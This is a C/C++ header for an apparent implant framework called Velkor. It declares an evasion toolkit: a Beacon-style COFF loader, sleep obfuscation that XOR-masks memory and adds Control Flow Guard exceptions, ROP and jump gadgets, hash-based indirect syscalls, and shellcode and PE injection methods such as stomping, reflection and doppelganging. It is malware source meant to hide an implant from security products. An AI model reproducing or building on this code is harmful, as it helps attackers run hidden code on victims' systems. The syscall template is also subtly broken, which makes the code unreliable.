#ifndef EVASION_H
#define EVASION_H

#include <Velkor.h>

/* ================[ Coff.cc ]================ */

#define COFF_DEC_VAR  0
#define COFF_DEC_FUNC 1
#define COFF_IMP_FUNC 2

#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_OUTPUT_UTF8 0x20
#define CALLBACK_ERROR       0x0d

typedef struct {
    PCHAR Original;
    PCHAR Buffer;
    INT   Length;
    INT   Size;
} DATAP, *PDATAP;

typedef struct {
    PVOID Base;
    ULONG Size;
} SEC_MAP, *PSEC_MAP;

typedef struct {
    union {
        PVOID              Base;
        PIMAGE_FILE_HEADER Header;
    };

    PVOID*                SymMap;
    PSEC_MAP              SecMap;
    PIMAGE_SYMBOL         SymTable;
    PIMAGE_SECTION_HEADER SecHeader;
} COFF_DATA, *PCOFF_DATA;

namespace Beacon {

    VOID   DataParse( PDATAP Parser, PCHAR Buffer, INT Size );
    INT    DataInt( PDATAP Parser );
    SHORT  DataShort( PDATAP Parser );
    INT    DataLength( PDATAP Parser );
    PCHAR  DataExtract( PDATAP Parser, PINT Size );

    VOID   Output( INT Type, PCHAR Data, INT Len );
    VOID   Printf( INT Type, PCHAR Fmt, ... );
}

/*============[ SleepObf.cc ]============*/

#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {    \
        Rop[ i ].Rax = U_64( p );                   \
    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {  \
        Rop[ i ].Rbx = U_64( & p );                 \
    } else {                                        \
        Rop[ i ].Rip = U_64( p );                   \
    }

EXTERN_C enum {
    VkMaskWait,
    VkMaskTimer,
    VkMaskApc
} eVKSLEEP;

/*!
 * @brief 
 * Xor algorithm to cipher memory block
 * 
 * @param MemPtr
 * Pointer to memory to cipher
 * 
 * @param MemSize
 * Size of memory to cipher
 * 
 * @param KeyPtr
 * Pointer to key to use in cipher
 * 
 * @param KeySize
 * Size of key to use in cipher
 */
VOID XorCipher( 
    _In_ PBYTE  MemPtr, 
    _In_ SIZE_T MemSize, 
    _In_ PBYTE  KeyPtr, 
    _In_ SIZE_T KeySize 
);

/*!
 * @brief
 * Add memory address to CFG exception, its very important to sleep obfuscation
 * 
 * @param ProcessHandle
 * Process handle to add CFG exception
 * 
 * @param BaseAddress
 * Base address to add CFG exception
 * 
 * @param Size
 * Size of address to add CFG exception
 */
VOID CfgExceptionPrivateAdd(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID  BaseAddress,
    _In_ DWORD  Size
);

/*!
 * @brief 
 * Add API/Function to CFG exception
 * 
 * @param ImageBase
 * Image base to add in CFG exception
 * 
 * @param Function
 * Function address to add in CFG exception
 */
VOID CfgExceptionAdd( 
    _In_ PVOID ImageBase,
    _In_ PVOID Function
);

/*!
 * @brief
 * Check if CFG is enabled in current process
 * 
 * @return
 * Return true if enabled, and false to disabled
 */
BOOL CfgCheckEnabled(
    VOID
);

/*!
 * @brief
 * Sleep obfuscation APC base using Stack Duplication during sleep, Heap Obf, JmpGadgets, NtContinue gadget and NtTestAlert return
 * 
 * @param SleepTime
 * Time to sleep
 */
VOID ApcObf( 
    _In_ ULONG SleepTime
);

/*!
 * @brief 
 * Sleep obfuscation Timer based using Stack Duplication during sleep, Heap Obf, JmpGadgets and NtContinue gadget
 * 
 * @param SleepTime
 * Time to sleep
 */
VOID TimerObf(
    _In_ ULONG SleepTime
);

/*!
 * @brief
 * Wrapper function for handler sleep technique
 * 
 * @param SleepTime
 */
VOID SleepMain(
    _In_ ULONG SleepTime
);

/*============[ Syscall.cc ]============*/

#define SEED        0xEDB88320
#define UP          -32
#define DOWN        32
#define RANGE       0xFF

typedef struct _VK_SYSCALL {
    ULONG Ssn;
    ULONG FuncHash;
    PVOID FuncAddress;
    PVOID SyscallAddress;
}  VK_SYSCALL, *PVK_SYSCALL;

BOOL RetrieveSyscall(
    _In_  ULONG       InpHash, 
    _Out_ PVK_SYSCALL VkSyscall 
);

EXTERN_C PVOID SyscallAddr;
EXTERN_C ULONG SysSrvNumber;

EXTERN_C VOID SetSsn( _In_ ULONG Ssn, _In_ PVOID SyscallAddress );
EXTERN_C NTSTATUS SyscallExec();

#define SET_SYSCALL( VkSys )     SetSsn( VkSys.Ssn, VkSys.SyscallAddress )

template< typename... Args >
NTSTATUS VkSyscallExec( VK_SYSCALL Sys, Args... args ) {
    SET_SYSCALL( Sys );
    NTSTATUS SyscallExec( args... ); 
}

/*  */

typedef enum _UNWIND_OP_CODES {
    UWOP_PUSH_NONVOL = 0, /* info == register number */
    UWOP_ALLOC_LARGE,     /* no info, alloc size in next 2 slots */
    UWOP_ALLOC_SMALL,     /* info == size of allocation / 8 - 1 */
    UWOP_SET_FPREG,       /* no info, FP = RSP + UNWIND_INFO.FPRegOffset*16 */
    UWOP_SAVE_NONVOL,     /* info == register number, offset in next slot */
    UWOP_SAVE_NONVOL_FAR, /* info == register number, offset in next 2 slots */
    UWOP_SAVE_XMM128 = 8, /* info == XMM reg number, offset in next slot */
    UWOP_SAVE_XMM128_FAR, /* info == XMM reg number, offset in next 2 slots */
    UWOP_PUSH_MACHFRAME   /* info == 0: no error-code, 1: error-code */
} UNWIND_CODE_OPS;

typedef union _UNWIND_CODE {
    struct {
        BYTE CodeOffset;
        BYTE UnwindOp : 4;
        BYTE OpInfo   : 4;
    };
    USHORT FrameOffset;
} UNWIND_CODE, *PUNWIND_CODE;

typedef struct {
    BYTE Version : 3;
    BYTE Flags   : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset   : 4;
    UNWIND_CODE UnwindCode[1];
} UNWIND_INFO, *PUNWIND_INFO;

/* ============[ Injection.cc ]============ */

typedef struct {
    PSTR PipeName;
    PSTR Argument;
} PEX_FORK, *PPEX_FORK;

typedef struct {
    HANDLE PipeRead;
    HANDLE PipeWrite;
} PEX_INLINE, *PPEX_INLINE;

typedef enum {
    PexInline,
    PexFork
} PEX_TYPE;

typedef struct {
    PEX_TYPE   Type;
    PEX_INLINE Inline;
    PEX_FORK   Fork;
} PEX_ARGS, *PPEX_ARGS;

typedef enum {
    ScStomping,
    ScClassic
} SC_INJ_T;

#define SC_INJ_T_LEN ( ScClassic + 1 )

enum {
    PeReflection,
    PeOverloading,
    PeDoppelganging
} PE_INJ_T;

namespace Injection {

    namespace Shellcode {

        BOOL Classic( HANDLE ProcessHandle, PBYTE ShellcodeBuffer, PSIZE_T ShellcodeSize, PVOID Parameter, BOOL PostEx );

    }

    namespace Pe {

    }

}

#endif // EVASION_H
